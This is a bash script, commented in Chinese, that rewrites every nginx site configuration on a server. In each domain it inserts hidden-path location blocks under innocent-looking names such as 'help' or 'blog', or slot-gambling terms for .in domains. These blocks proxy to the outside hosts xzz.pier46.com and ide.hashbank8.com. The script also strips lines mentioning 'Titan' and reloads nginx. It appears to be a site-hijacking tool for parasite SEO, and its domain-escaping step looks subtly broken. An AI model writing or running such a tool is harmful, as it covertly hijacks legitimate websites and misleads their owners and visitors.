#!/bin/bash
# 文件名：nginx_per_domain_com_in.sh
# 功能：每个 server_name 完全独立的隐蔽路径（.com 和 .in 分别走不同后端）
# 修复版：2025-12-07 终极稳定版

NGINX_DIR="/etc/nginx/sites-enabled"
COM_PATHS=("help" "news" "page" "blog" "bangzhuzhongxin" "zh" "pc")
IN_PATHS=("pg" "pgslot" "slot")

# 解决子 shell 问题：用临时文件传递映射关系
TMP_MAP=$(mktemp)
> "$TMP_MAP"

COM_TEMPLATE=$(cat <<'EOF'
    location /%PATH%/ {
        if ($host ~* ^%DOMAIN%$) {
            set $fullurl "$scheme://$host$request_uri";
            rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        }
        proxy_set_header Host xzz.pier46.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://xzz.pier46.com;
    }
EOF
)

IN_TEMPLATE=$(cat <<'EOF'
    location /%PATH%/ {
        if ($host ~* ^%DOMAIN%$) {
            set $fullurl "$scheme://$host$request_uri";
            rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        }
        proxy_set_header Host ide.hashbank8.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://ide.hashbank8.com;
    }
EOF
)

echo "开始处理所有站点，为每个 server_name 生成独立 location 规则"
echo "================================================================="

find "$NGINX_DIR" \( -type f -o -type l \) -print0 2>/dev/null | while IFS= read -r -d '' file; do
    [[ -f "$file" || -L "$file" ]] || continue
    filename=$(basename "$file")
    echo "正在处理 → $filename"

    # 关键修复：正确提取 server_name 并去掉末尾分号
    domains=$(awk '
        /^[[:space:]]*server_name/ {
            gsub(/^[[:space:]]*server_name[[:space:]]+/, "")
            gsub(/;.*$/, "")           # 正确写法：分号在前
            gsub(/#.*$/, "")            # 去掉行尾注释
            print
        }
    ' "$file" | tr ' ;\t' '\n' | grep -v '^$' | sort -u)

    [[ -z "$domains" ]] && { echo " 无 server_name，跳过"; continue; }

    all_locations=""
    domain_count=0

    for domain in $domains; do
        ((domain_count++))
        domain_lower=$(echo "$domain" | tr '[:upper:]' '[:lower:]')

        if [[ "$domain_lower" == *.in ]]; then
            path="${IN_PATHS[$RANDOM % ${#IN_PATHS[@]}]}"
            template="$IN_TEMPLATE"
            backend="ide.hashbank8.com"
            echo " ✓ $domain → /$path/ → $backend"
        else
            path="${COM_PATHS[$RANDOM % ${#COM_PATHS[@]}]}"
            template="$COM_TEMPLATE"
            backend="xzz.pier46.com"
            echo " ✓ $domain → /$path/ → $backend"
        fi

        location_block=$(echo "$template" | sed "s/%PATH%/$path/g; s/%DOMAIN%/\$(echo $domain | sed 's/[.]/[.]'/g)/g")
        all_locations+="$location_block\n\n"

        # 写入临时映射文件
        echo "$domain:/$path/ → $backend" >> "$TMP_MAP"
    done

    # 插入所有 location（在 server_name 那行后面）
    tmp=$(mktemp)
    awk -v blocks="\n$all_locations" '
    {
        print
        if ($0 ~ /^[[:space:]]*server_name.*;.*$/) {
            print blocks
        }
    }' "$file" > "$tmp"

    # 清理 Titan、空行等
    sed -i '/[Tt][Ii][Tt][Aa][Nn]/d; /^[[:space:]]*$/d' "$tmp" 2>/dev/null || true

    if ! cmp -s "$tmp" "$file" 2>/dev/null; then
        mv "$tmp" "$file"
        echo -e "\033[32m 成功更新 $filename（共 $domain_count 个域名）\033[0m\n"
    else
        rm -f "$tmp"
        echo -e "\033[33m 配置已存在，无变化\033[0m\n"
    fi
done

# 重载 Nginx
echo "正在重载 Nginx..."
if nginx -t >/dev/null 2>&1; then
    systemctl reload nginx 2>/dev/null || nginx -s reload 2>/dev/null
    echo -e "\033[32mNginx 配置正确，已平滑重载成功！\033[0m"
else
    echo -e "\033[31mNginx 配置语法错误！请执行 nginx -t 查看详情\033[0m"
    exit 1
fi

# 输出最终映射表（从临时文件读取，避免子 shell 丢失）
echo ""
echo "最终每个域名独立路径分配结果"
echo "============================================================================"
printf "%-50s → \033[1;33m%-35s\033[0m\n" "域名" "访问路径 + 后端"
echo "----------------------------------------------------------------------------"
sort "$TMP_MAP" | while read line; do
    domain="${line%%:*}"
    path_backend="${line#*:}"
    printf "%-50s → \033[1;33m%s\033[0m\n" "$domain" "$path_backend"
done
total=$(wc -l < "$TMP_MAP")
echo "----------------------------------------------------------------------------"
echo "总计独立域名数：$total 个"
echo ".com 类路径池：${COM_PATHS[*]}"
echo ".in  类路径池：${IN_PATHS[*]}"
echo "============================================================================"
echo -e "\n脚本执行完成！所有域名已分配唯一隐蔽路径\n"

# 清理临时文件
rm -f "$TMP_MAP"
exit 0
